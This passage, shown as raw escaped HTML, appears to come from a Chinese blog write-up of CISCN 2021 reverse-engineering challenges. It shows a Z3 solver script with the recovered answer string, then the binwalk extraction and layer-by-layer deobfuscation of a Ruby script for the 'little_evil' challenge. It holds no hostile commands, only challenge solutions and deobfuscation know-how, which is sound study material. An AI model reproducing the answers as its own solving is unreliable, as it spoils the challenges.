s&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;add(flag[&lt;span style=&#34;color:#ae81ff&#34;&gt;20&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; flag[&lt;span style=&#34;color:#ae81ff&#34;&gt;21&lt;/span&gt;])
s&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;add(flag[&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; flag[&lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;])
s&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;add(flag[&lt;span style=&#34;color:#ae81ff&#34;&gt;13&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; flag[&lt;span style=&#34;color:#ae81ff&#34;&gt;14&lt;/span&gt;])
s&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;add(flag[&lt;span style=&#34;color:#ae81ff&#34;&gt;22&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; flag[&lt;span style=&#34;color:#ae81ff&#34;&gt;23&lt;/span&gt;])

s&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;add(flag[&lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; flag[&lt;span style=&#34;color:#ae81ff&#34;&gt;11&lt;/span&gt;])

s&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;add(flag[&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; flag[&lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;])
s&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;add(flag[&lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; flag[&lt;span style=&#34;color:#ae81ff&#34;&gt;9&lt;/span&gt;])

s&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;add(flag[&lt;span style=&#34;color:#ae81ff&#34;&gt;13&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; flag[&lt;span style=&#34;color:#ae81ff&#34;&gt;18&lt;/span&gt;])
s&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;add(flag[&lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; flag[&lt;span style=&#34;color:#ae81ff&#34;&gt;21&lt;/span&gt;])
s&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;add(flag[&lt;span style=&#34;color:#ae81ff&#34;&gt;19&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; flag[&lt;span style=&#34;color:#ae81ff&#34;&gt;24&lt;/span&gt;])

&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(&lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;):
    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; j &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(&lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;):
        &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; k &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(&lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;):
            &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; j &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; k:
                &lt;span style=&#34;color:#66d9ef&#34;&gt;continue&lt;/span&gt;
            s&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;add(flag[&lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; j] &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; flag[&lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; k])
            s&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;add(flag[&lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; j &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; i] &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; flag[&lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; k &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; i])

&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; s&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;check() &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; sat:
    model &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; s&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;model()
    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(&lt;span style=&#34;color:#ae81ff&#34;&gt;25&lt;/span&gt;):
        print (model[flag[i]]&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;as_long()&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;real, end&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;)

print (&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;finish&amp;#39;&lt;/span&gt;)
&lt;span style=&#34;color:#75715e&#34;&gt;# 1425353142354212153442315&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;最后把两个地方改成 0 就行了&lt;/p&gt;
&lt;h2 id=&#34;little_evil&#34;&gt;little_evil&lt;/h2&gt;
&lt;h3 id=&#34;基本分析&#34;&gt;基本分析&lt;/h3&gt;
&lt;p&gt;直接用ida直接打开会看到一个叫做&amp;quot;squashfs&amp;quot;，而且和ruby有关，但比赛的时候没有多想，然后就走远了&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 230; 
			flex-basis: 552px&#34;
	&gt;
	&lt;a href=&#34;/post/ciscn2021-re-writeup/%E7%8F%8D%E8%B4%B5%E6%88%AA%E5%9B%BE.png&#34; data-size=&#34;1315x571&#34;&gt;
		&lt;img src=&#34;/post/ciscn2021-re-writeup/%E7%8F%8D%E8%B4%B5%E6%88%AA%E5%9B%BE.png&#34;
			width=&#34;1315&#34;
			height=&#34;571&#34;
			srcset=&#34;/post/ciscn2021-re-writeup/%E7%8F%8D%E8%B4%B5%E6%88%AA%E5%9B%BE_hu30ea2b23d1fa00b41fb8c191982c9cbe_47250_480x0_resize_box_3.png 480w, /post/ciscn2021-re-writeup/%E7%8F%8D%E8%B4%B5%E6%88%AA%E5%9B%BE_hu30ea2b23d1fa00b41fb8c191982c9cbe_47250_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;放一张珍贵截图&lt;/p&gt;
&lt;p&gt;后来得知正确方法需要先用binwalk分解一下，这里有个坑，需要自己手动装一个&amp;quot;squashfs&amp;quot;的插件&lt;/p&gt;
&lt;p&gt;顺便补充一下什么是&amp;quot;squashfs&amp;quot;：基于Linux内核使用的压缩只读文件系统。难怪要用binwalk，沉思&lt;/p&gt;
&lt;h3 id=&#34;利用输出去混淆&#34;&gt;利用输出去混淆&lt;/h3&gt;
&lt;p&gt;分解后翻一下目录，可以找到一个 &lt;code&gt;out.rb&lt;/code&gt; 的文件&lt;/p&gt;
&lt;p&gt;打开后发现是一个被严重混淆的脚本，大概长下面这样&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-ruby&#34; data-lang=&#34;ruby&#34;&gt;$l1Il&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;;
$l1lI&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;;
&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;llIl&lt;/span&gt;() $lI1lll&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;$lI1lll&lt;span style=&#34;color:#f92672&#34;&gt;|&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;; &lt;span style=&#34;color:#66d9ef&#34;&gt;end&lt;/span&gt;;
&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;l1lll&lt;/span&gt;() $lI1lll&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;; &lt;span style=&#34;color:#66d9ef&#34;&gt;end&lt;/span&gt;;
&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;llI1l&lt;/span&gt;() $lI1lll&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;$lI1lll&lt;span style=&#34;color:#f92672&#34;&gt;|&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;; &lt;span style=&#34;color:#66d9ef&#34;&gt;end&lt;/span&gt;;
&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;lIlI&lt;/span&gt;() $lI1lll&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;$lI1lll&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;; &lt;span style=&#34;color:#66d9ef&#34;&gt;end&lt;/span&gt;;
&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;l111&lt;/span&gt;() $lI1lll&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;$lI1lll&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;; &lt;span style=&#34;color:#66d9ef&#34;&gt;end&lt;/span&gt;;
&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;lI1IlI&lt;/span&gt;() $lI1lll&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;$lI1lll&lt;span style=&#34;color:#f92672&#34;&gt;|&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;; &lt;span style=&#34;color:#66d9ef&#34;&gt;end&lt;/span&gt;;
&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;ll1l1&lt;/span&gt;() $lI1lll&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;$lI1lll&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;; &lt;span style=&#34;color:#66d9ef&#34;&gt;end&lt;/span&gt;;
&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;l1lI&lt;/span&gt;() $lI1lll&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;$lI1lll&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;; &lt;span style=&#34;color:#66d9ef&#34;&gt;end&lt;/span&gt;;
&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;lI1lII&lt;/span&gt;() $lI1lll&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;$lI1lll&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;; &lt;span style=&#34;color:#66d9ef&#34;&gt;end&lt;/span&gt;;
&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;lIlIl&lt;/span&gt;() $lI1lll&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;$lI1lll&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;; &lt;span style=&#34;color:#66d9ef&#34;&gt;end&lt;/span&gt;;
&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;lIll&lt;/span&gt;() $lI1lll&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;$lI1lll&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;; &lt;span style=&#34;color:#66d9ef&#34;&gt;end&lt;/span&gt;;
&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;lII1&lt;/span&gt;() $lI1lll&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;$lI1lll&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;; &lt;span style=&#34;color:#66d9ef&#34;&gt;end&lt;/span&gt;;
&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;l1III&lt;/span&gt;() $lI1lll&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;$lI1lll&lt;span style=&#34;color:#f92672&#34;&gt;|&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;; &lt;span style=&#34;color:#66d9ef&#34;&gt;end&lt;/span&gt;;
&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;l1l111&lt;/span&gt;() $lI1lll&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;$lI1lll&lt;span style=&#34;color:#f92672&#34;&gt;|&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;; &lt;span style=&#34;color:#66d9ef&#34;&gt;end&lt;/span&gt;;
&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;l1IIII&lt;/span&gt;() $lI1lll&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;$lI1lll&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;; &lt;span style=&#34;color:#66d9ef&#34;&gt;end&lt;/span&gt;;
&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;l11I&lt;/span&gt;() $l1Il&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;$l1Il&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;$lI1lll&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;chr; &lt;span style=&#34;color:#66d9ef&#34;&gt;end&lt;/span&gt;;
&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;lIlll&lt;/span&gt;() $lI1lll&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;$lI1lll&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;9&lt;/span&gt;; &lt;span style=&#34;color:#66d9ef&#34;&gt;end&lt;/span&gt;;
&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;l11IlI&lt;/span&gt;() $lI1lll&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;$lI1lll&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;; &lt;span style=&#34;color:#66d9ef&#34;&gt;end&lt;/span&gt;;
&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;lI1I1&lt;/span&gt;() $lI1lll&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;$lI1lll&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;; &lt;span style=&#34;color:#66d9ef&#34;&gt;end&lt;/span&gt;;
&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;ll11lI&lt;/span&gt;() $lI1lll&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;$lI1lll&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;9&lt;/span&gt;; &lt;span style=&#34;color:#66d9ef&#34;&gt;end&lt;/span&gt;;
&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;lII1l1&lt;/span&gt;()
    &lt;span style=&#34;color:#75715e&#34;&gt;#send($l1Il[0,4], $l1Il[4,$l1Il.length]);&lt;/span&gt;
    aFile&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;File&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;new(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;out2.rb&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;w&amp;#34;&lt;/span&gt;);
    aFile&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;syswrite($l1Il);
    aFile&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;close;
&lt;span style=&#34;color:#66d9ef&#34;&gt;end&lt;/span&gt;;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;最后一个函数里本来只有一个 &lt;code&gt;send&lt;/code&gt; 方法，这个方法是执行第一个参数的函数，后面的参数都是这个函数的变量&lt;/p&gt;
&lt;p&gt;这里跟着学长学习了一个针对解释性语言混淆的办法，就是直接输出这个send中的变量&lt;/p&gt;
&lt;p&gt;输出之后还是一个相似的脚本，简单换一下行，长这样：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-ruby&#34; data-lang=&#34;ruby&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# eval&lt;/span&gt;
$llll&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;;
$llII&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;;
&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;l1llI&lt;/span&gt;()$l1lI1l&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;$l1lI1l&lt;span style=&#34;color:#f92672&#34;&gt;|&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;; &lt;span style=&#34;color:#66d9ef&#34;&gt;end&lt;/span&gt;; 
&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;ll1III&lt;/span&gt;()$l1lI1l&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;$l1lI1l&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;; &lt;span style=&#34;color:#66d9ef&#34;&gt;end&lt;/span&gt;; 
&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;lllI&lt;/span&gt;()$l1lI1l&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;$l1lI1l&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;; &lt;span style=&#34;color:#66d9ef&#34;&gt;end&lt;/span&gt;; 
&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;lIl1l&lt;/span&gt;()$l1lI1l&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;$l1lI1l&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;; &lt;span style=&#34;color:#66d9ef&#34;&gt;end&lt;/span&gt;; 
&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;l1lll&lt;/span&gt;()$l1lI1l&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;$l1lI1l&lt;span style=&#34;color:#f92672&#34;&gt;|&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;; &lt;span style=&#34;color:#66d9ef&#34;&gt;end&lt;/span&gt;; 
&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;l11I1I&lt;/span&gt;()$l1lI1l&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;; &lt;span style=&#34;color:#66d9ef&#34;&gt;end&lt;/span&gt;; 
&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;l1l1&lt;/span&gt;()$l1lI1l&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;$l1lI1l&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;; &lt;span style=&#34;color:#66d9ef&#34;&gt;end&lt;/span&gt;; 
&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;l1II&lt;/span&gt;()$l1lI1l&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;$l1lI1l&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;; &lt;span style=&#34;color:#66d9ef&#34;&gt;end&lt;/span&gt;; 
&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;ll1I&lt;/span&gt;()$l1lI1l&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;$l1lI1l&lt;span style=&#34;color:#f92672&#34;&gt;|&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;; &lt;span style=&#34;color:#66d9ef&#34;&gt;end&lt;/span&gt;; 
&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;ll11&lt;/span&gt;()$l1lI1l&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;$l1lI1l&lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;; &lt;span style=&#34;color:#66d9ef&#34;&gt;end&lt;/span&gt;; 
&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;ll1l1I&lt;/span&gt;()$l1lI1l&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;$l1lI1l&lt;span style=&#34;color:#f92672&#34;&gt;|&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;; &lt;span style=&#34;color:#66d9ef&#34;&gt;end&lt;/span&gt;; 
&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;lI1Il&lt;/span&gt;()$l1lI1l&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;$l1lI1l&lt;span style=&#34;color:#f92672&#34;&gt;|&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;; &lt;span style=&#34;color:#66d9ef&#34;&gt;end&lt;/span&gt;; 
&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;llI1I&lt;/span&gt;()$l1lI1l&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;$l1lI1l&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;; &lt;span style=&#34;color:#66d9ef&#34;&gt;end&lt;/span&gt;; 
&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;llIl1&lt;/span&gt;()$l1lI1l&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;$l1lI1l&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;; &lt;span style=&#34;color:#66d9ef&#34;&gt;end&lt;/span&gt;; 
&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;lI1ll&lt;/span&gt;()$l1lI1l&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;$l1lI1l&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;; &lt;span style=&#34;color:#66d9ef&#34;&gt;end&lt;/span&gt;; 
&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;l1111&lt;/span&gt;()$l1lI1l&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;$l1lI1l&lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;; &lt;span style=&#34;color:#66d9ef&#34;&gt;end&lt;/span&gt;; 
&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;l1lII&lt;/span&gt;()$l1lI1l&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;$l1lI1l&lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;; &lt;span style=&#34;color:#66d9ef&#34;&gt;end&lt;/span&gt;; 
